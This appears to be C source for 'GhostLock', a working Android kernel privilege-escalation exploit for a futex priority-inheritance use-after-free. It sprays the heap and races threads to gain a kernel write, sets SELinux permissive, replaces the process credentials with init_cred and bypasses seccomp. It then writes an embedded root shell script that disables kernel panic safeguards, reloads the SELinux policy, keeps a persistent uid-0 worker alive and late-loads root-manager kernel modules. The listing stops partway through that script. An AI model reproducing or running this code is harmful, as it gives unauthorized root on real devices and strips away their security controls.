/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 */

#include "common.h"
#include "offsets.h"
#include <ctype.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/system_properties.h>
#include <sys/utsname.h>
#include <strings.h>
#include <poll.h>
#include <grp.h>
#include <elf.h>
#include <stdarg.h>
#include <sys/stat.h>

const struct kernel_offsets *active_offsets = NULL;

static char g_home_dir[256] = "/data/local/tmp";
static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";

/* MTK and XRing use different physical mappings from the Qualcomm default.
 * W1 has no root and /proc is SELinux-blocked: read SoC properties from the
 * shared property area instead. */
enum soc_family {
  SOC_QCOM = 0,
  SOC_MTK,
  SOC_XRING,
};

static enum soc_family detect_soc(void) {
  char buf[256];
  const char *keys[] = {"ro.soc.manufacturer", "ro.soc.model",
                        "ro.board.platform", NULL};
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "mediatek", 8) == 0 ||
        strncasecmp(buf, "mtk", 3) == 0 ||
        (i > 0 && strncasecmp(buf, "mt", 2) == 0)) {
      return SOC_MTK;
    }
  }
  for (int i = 0; keys[i]; i++) {
    if (__system_property_get(keys[i], buf) <= 0 || !buf[0]) {
      continue;
    }
    if (strncasecmp(buf, "xring", 5) == 0 ||
        (i > 0 && strncasecmp(buf, "o1", 2) == 0)) {
      return SOC_XRING;
    }
  }
  return SOC_QCOM;
}

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"
/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF           0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF           0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG     0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif
#include "offsets_json.h"

static struct kernel_offsets g_external_offsets;
static char g_external_release[192];

/* Entries carry a phys load address only when measured; otherwise MTK uses
 * the DRAM base, xring its constant, qcom its GKI version. */
static void publish_active_offsets(void) {
  g_init_cred_image = INIT_CRED;
  enum soc_family soc = detect_soc();
  const char *soc_name =
      soc == SOC_MTK ? "mtk" : soc == SOC_XRING ? "xring" : "qcom/other";
  if (active_offsets->kernel_phys_load) {
    p0_kernel_phys_load = active_offsets->kernel_phys_load;
  } else if (soc == SOC_MTK) {
    p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
    soc_name = "mtk";
  } else if (soc == SOC_XRING) {
    p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
    soc_name = "xring";
  } else if (strncmp(active_offsets->uname_r, "6.12.", 5) == 0) {
    p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
    soc_name = "qcom/6.12";
  }
  pr_info("soc: %s; kernel_phys_load=0x%llx\n",
          soc_name, (unsigned long long)p0_kernel_phys_load);
  pr_info("init_cred image=%016zx alias=%016zx\n",
          (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
}

/* Import a matching entry from <home>/offsets.json; returns 0 and activates
 * the external table on success.  When the release is also registered in the
 * built-in table, the entry starts from the built-in values so fields the
 * JSON leaves empty keep the built-in ones instead of falling back to
 * target.h defaults. */
static int try_external_offsets(const char *release) {
  char path[320];
  snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
  const struct kernel_offsets *builtin = NULL;
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(release, known_offsets[i].uname_r) == 0) {
      builtin = &known_offsets[i];
      break;
    }
  }
  if (builtin) {
    g_external_offsets = *builtin;
  } else {
    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
  }
  int rc = load_offsets_json(path, release, &g_external_offsets,
                             g_external_release, sizeof(g_external_release));
  if (rc == 0) {
    active_offsets = &g_external_offsets;
    pr_success("offsets imported from offsets.json: %s\n",
               active_offsets->uname_r);
  } else {
    pr_info("no external offsets match at %s\n", path);
  }
  return rc;
}
static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  /* Imported offsets win over the built-in tables so refreshed values take
   * effect without rebuilding the app. */
  if (try_external_offsets(uts.release) == 0) {
    publish_active_offsets();
    return 0;
  }
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      publish_active_offsets();
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
           "offsets.json entry into %s\n",
           g_home_dir);
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  if (tcp_route_selected()) {
    do_tcp_fake_lock_route();
  } else {
    do_pselect_fake_lock_route();
  }
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        /* rotate the nice every call; (calls%19)+1 is what makes
         * sched_setattr succeed on 6.1 compact */
        int consumer_nice = (active_offsets && active_offsets->compact_waiter)
                                ? (calls_this_seq % 19) + 1
                                : PSELECT_CONSUMER_NICE;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  route_last_step = 0; route_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && route_last_step == 0;
}

static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  /* Both transports write *(target) := value through the erase left-only
   * relink: waiter words are {pc = value, right = 0, left = target} and
   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page();
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  int routed = run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

int g_core_main = 0;
int g_core_consumer = 1;

void init_cpu_config(void) {
  g_core_main = 0;
  g_core_consumer = 1;

  const char *s = getenv("GHOSTLOCK_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_main = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
    }
  }
  s = getenv("GHOSTLOCK_CONSUMER_CORE");
  if (s && *s) {
    long v = strtol(s, NULL, 10);
    if (v >= 0 && v < CPU_SETSIZE) {
      g_core_consumer = (int)v;
    } else {
      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
                 g_core_consumer);
    }
  } else {
    g_core_consumer = g_core_main + 1;
  }

  if (g_core_main == g_core_consumer) {
    pr_warning("main and consumer cores are the same (%d); falling back\n",
               g_core_main);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  cpu_set_t allowed;
  if (sched_getaffinity(0, sizeof(allowed), &allowed) == 0 &&
      (!CPU_ISSET(g_core_main, &allowed) ||
       !CPU_ISSET(g_core_consumer, &allowed))) {
    pr_warning("cores %d/%d not in allowed cpuset; falling back to 0/1\n",
               g_core_main, g_core_consumer);
    g_core_main = 0;
    g_core_consumer = 1;
  }

  pr_info("cpu pair: main=%d consumer=%d\n", g_core_main, g_core_consumer);
}

static void init_runtime_paths(void) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = "/data/local/tmp";

  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
  size_t n = strlen(g_home_dir);
  while (n > 1 && g_home_dir[n - 1] == '/') {
    g_home_dir[--n] = '\0';
  }
  /* Keep the script on /data/local/tmp. Two measured facts decide this:
   *  - /sdcard is FUSE, and a process whose cred is init_cred (our SELF-W2
   *    result -> kernel domain) gets rejected by the FUSE daemon, so nothing
   *    could be written/read there.
   *  - /data is f2fs with fsync_mode=nobarrier, so plain fsync() does NOT
   *    guarantee the data reaches flash before a crash; the file then reads
   *    back as its declared size of blank filler. We therefore force it with
   *    sync() + a short settle delay in write_root_script().
   * (/data/local/tmp does NOT actually roll back on reboot -- that earlier
   * reading was wrong.) */
  snprintf(g_root_script_path, sizeof(g_root_script_path),
           "%s/.ghostlock_root.sh", g_home_dir);
  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
}

static void write_root_script(void) {
  /* 8 KiB: the script (ksud discovery + policy fixup + safe-mode + the
   * persistent-root worker) outgrew 4096 and snprintf was silently
   * truncating its tail, cutting off the ksud late-load. */
  char script[32768];    /* grew past 8 KiB: truncation would silently drop the tail commands */
  /* Bake the GHOSTLOCK_* knobs into the script instead of letting the script
   * read them from the environment. The script is run by a detached setsid
   * worker (fork + setsid + execl below); on this device the inherited
   * environ does not survive that chain -- measured 2026-09-10: both
   * GHOSTLOCK_SKIP_POLICY_FIXUP=1 and GHOSTLOCK_INSMOD_ONLY=1 were silently
   * ignored ("[*] fixup: attempt 1" and "late-load --module" still ran, with
   * no "SKIPPED"/"insmod-only" line in the log). Baking the values in removes
   * the dependency on env propagation entirely. */
  const char *e_skipfix = getenv("GHOSTLOCK_SKIP_POLICY_FIXUP");
  const char *e_insmod = getenv("GHOSTLOCK_INSMOD_ONLY");
  const char *v_skipfix = (e_skipfix && e_skipfix[0] == '1') ? "1" : "0";
  const char *v_insmod = (e_insmod && e_insmod[0] == '1') ? "1" : "0";
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               g_root_script_path, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "GHOSTLOCK_SKIP_FIXUP_BAKED='%s'\n"
      "GHOSTLOCK_INSMOD_ONLY_BAKED='%s'\n"
      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
      "KSUD=\"$HOME_DIR/ksud\"\n"
      /* Open the log FIRST. It used to sit behind a bare `sync`, and the hit
       * of 2026-09-11 10:20 produced no log at all although the script itself
       * landed on disk intact -- sync() walks every mounted filesystem to
       * flush dirty pages and is the first thing that can block forever (FUSE
       * /sdcard, dm-verity) or trip on the damaged cred. Nothing else may
       * precede the log line. */
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] shell=$0 argv0=$0\" >>\"$LOG\"\n"
      "sync 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      /* Locate the manager binary by glob expansion, not `find /data/app`.
       * Five chained finds walk the entire /data/app tree and burn seconds out
       * of the ~1 minute post-hit window; glob only expands one directory
       * level. APatch is probed first: it is the only manager installed here,
       * and the one whose loader (apd insmod) is proven to work on this kernel. */
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  for p in /data/app/*/me.bmax.apatch*/lib/arm64/libapd.so; do [ -x \"$p\" ] && KSUD=\"$p\" && break; done\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  for p in /data/app/*/*kernelsu*/lib/arm64/libksud.so; do [ -x \"$p\" ] && KSUD=\"$p\" && break; done\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  for p in /data/app/*/*resukisu*/lib/arm64/libksud.so; do [ -x \"$p\" ] && KSUD=\"$p\" && break; done\n"
      "fi\n"
      "if [ ! -x \"$KSUD\" ]; then\n"
      "  for p in /data/app/*/*supermanager*/lib/arm64/libksud.so; do [ -x \"$p\" ] && KSUD=\"$p\" && break; done\n"
      "fi\n"
      "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
      "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
      "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
      "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "if [ \"$(id -u)\" -ne 0 ]; then\n"
      "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      /* Persist for the rest of the boot: keep one uid-0 worker alive in its
       * own session (oom-protected) so the privileged state outlives this
       * script and the exploit parent -- the parent kills its whole group on
       * timeout, and setsid here is what escapes that. The kernel-side root
       * state itself never expires (task->cred points at the resident
       * init_cred, no refcount can free it); it only helps while a live
       * uid-0 process exists to derive new ones from. */
      "setsid sh -c 'echo -1000 > /proc/self/oom_score_adj 2>/dev/null; "
      "touch /data/local/tmp/.ghostlock_root_alive 2>/dev/null; "
      "exec cat /dev/kmsg >> \"$HOME_DIR/.ghostlock_kmsg.log\" 2>/dev/null' </dev/null >/dev/null 2>&1 &\n"
      "echo '[*] persistent root worker spawned (kmsg recorder on /sdcard)' >>\"$LOG\"\n"
      "# Keep oopses from rebooting the device. Measured model (on-device, 5.10):\n"
      "# every pselect has only ~18 percent chance of surviving, so the full chain\n"
      "# is p^2 ~ 3 percent. But W1_ATTEMPTS/W2_ATTEMPTS are 15: with oopses NOT\n"
      "# fatal the retry loops raise W1 to 1-(1-0.18)^15 ~ 95 percent.\n"
      "# Panic-on-oops rebooting the device is what silently defeats that retry\n"
      "# budget -- so disable it the moment we hold root.\n"
      "echo 0 > /proc/sys/kernel/panic_on_oops 2>/dev/null\n"
      "echo \"[*] panic_on_oops=$(cat /proc/sys/kernel/panic_on_oops 2>/dev/null)\" >>\"$LOG\"\n"
      "# Second reboot trigger, independent of panic_on_oops. cmdline carries\n"
      "# kernel.panic_on_rcu_stall=1, so a single stalled RCU grace period reboots\n"
      "# the device even with oopses tamed. Measured: the device still went down\n"
      "# ~1 min after a hit whose script had already written panic_on_oops=0, and\n"
      "# kmsg showed no oops/panic trace -- a stall-triggered reboot fits. Turn it\n"
      "# off too while we hold root, so later PANIC rounds stop costing 70s each.\n"
      "echo 0 > /proc/sys/kernel/panic_on_rcu_stall 2>/dev/null\n"
      "echo \"[*] panic_on_rcu_stall=$(cat /proc/sys/kernel/panic_on_rcu_stall 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] sig_enforce=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null) cmdline=$(grep -o 'module.sig_enforce=[0-9]*' /proc/cmdline 2>/dev/null)\" >>\"$LOG\"\n"
      "dmesg > \"$HOME_DIR/.ghostlock_dmesg.log\" 2>/dev/null\n"
      "echo \"[*] dmesg snapshot: $(wc -c < \"$HOME_DIR/.ghostlock_dmesg.log\" 2>/dev/null) bytes\" >>\"$LOG\"\n"
      "# pstore/ramoops survives reboot: this is the only way to recover the oops\n"
      "# of the panics that killed the previous boots. Harvest it the moment we\n"
      "# hold root, before anything else can clear it.\n"
      "ls -la /sys/fs/pstore/ >>\"$LOG\" 2>&1\n"
      "cat /sys/fs/pstore/* > \"$HOME_DIR/.ghostlock_pstore.log\" 2>/dev/null\n"
      "echo \"[*] pstore harvested: $(wc -c < \"$HOME_DIR/.ghostlock_pstore.log\" 2>/dev/null) bytes\" >>\"$LOG\"\n"
      "KVER=$(uname -r | cut -d. -f1-2)\n"
      "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
      "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
      "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "KMI=\"${AVER}-${KVER}\"\n"
      "# safe mode: disable all modules before exec ksud\n"
      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
      "  n=0\n"
      "  for m in /data/adb/modules/*/; do\n"
      "    [ -d \"$m\" ] || continue\n"
      "    if touch \"${m}disable\" 2>/dev/null; then\n"
      "      n=$((n+1))\n"
      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
      "    fi\n"
      "  done\n"
      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
      "fi\n"
      "# step 1: restore policy\n"
      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
      "  exit 1\n"
      "}\n"
      "trap 'rm -f \"$POLICY\"' EXIT\n"
      "prepare_policy() {\n"
      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
      "  case \"$HEADER\" in\n"
      "    8cff7cf9080000005345204c696e7578\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
      "  esac\n"
      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
      "  [ -n \"$CONFIG\" ] || return 1\n"
      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
      "}\n"
      "FIXUP_RC=1\n"
      "# GHOSTLOCK_SKIP_POLICY_FIXUP=1 skips load_policy entirely.\n"
      "# Rationale (on-device evidence): replacing the whole SELinux policy makes\n"
      "# the *running* framework's contexts go unlabeled -- kmsg captured\n"
      "#   avc: denied { call } for comm=\"hidl_ssvc_poll\" scontext=u:object_r:unlabeled:s0 tclass=binder\n"
      "#   avc: denied { write } for comm=\"displayfeature@\" scontext=u:object_r:unlabeled:s0\n"
      "# after which system_server died (\"cmd: Can't find service: activity\") and\n"
      "# the device rebooted, discarding the freshly loaded kernelpatch module.\n"
      "# Under SELinux permissive the fixup is not needed: every denial above is\n"
      "# audited only (permissive=1) and late-load succeeded without its protection.\n"
      "if [ \"$GHOSTLOCK_SKIP_FIXUP_BAKED\" = \"1\" ]; then\n"
      "  echo '[*] policy fixup SKIPPED (permissive suffices)' >>\"$LOG\"\n"
      "  FIXUP_RC=0\n"
      "else\n"
      "for i in $(seq 1 10); do\n"
      "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
      "    sleep 2\n"
      "    continue\n"
      "  fi\n"
      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
      "  LPID=$!\n"
      "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
      "  SPID=$!\n"
      "  wait $LPID 2>/dev/null\n"
      "  FIXUP_RC=$?\n"
      "  kill $SPID 2>/dev/null\n"
      "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "    break\n"
      "  fi\n"
      "  sleep 2\n"
      "done\n"
      "fi\n"
      "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
      "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
      "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
      "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  KSU_ALREADY=1\n"
      "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
      "else\n"
      "  KSU_ALREADY=0\n"
      "  if [ ! -x \"$KSUD\" ]; then\n"
      "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
      "    exit 1\n"
      "  fi\n"
      "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
      "  chmod 755 \"$KSUD\" 2>/dev/null\n"
      "  case \"$KSUD\" in\n"
      "    *libapd.so)\n"
      "      # APatch jailbreak mode (magica lineage, apd/src/late_load.rs):\n"
      "      # load the KernelPatch .ko into the stock kernel, then (optionally)\n"
      "      # apply magisk policy live. No boot.img flash involved.\n"
      "      # NOTE ON vermagic (measured 2026-09-11, kernel log): with\n"
      "      # CONFIG_MODVERSIONS the kernel calls same_magic(..., has_crcs=1),\n"
      "      # which compares only the text AFTER the first space. So a\n"
      "      # '5.10.252-dirty SMP preempt mod_unload modversions aarch64'\n"
      "      # module loads fine on 5.10.149 -- the version number is ignored.\n"
      "# .ko / ksud are staged directly into /data/local/tmp by the harness,\n"
      "# which is NOT rolled back (that earlier reading was wrong); /sdcard is\n"
      "# unusable here because FUSE rejects a kernel-domain caller.\n"
      "      APKO=\"\"\n"
      "      if [ -f \"/data/adb/ap/${KMI}_kernelpatch.ko\" ]; then\n"
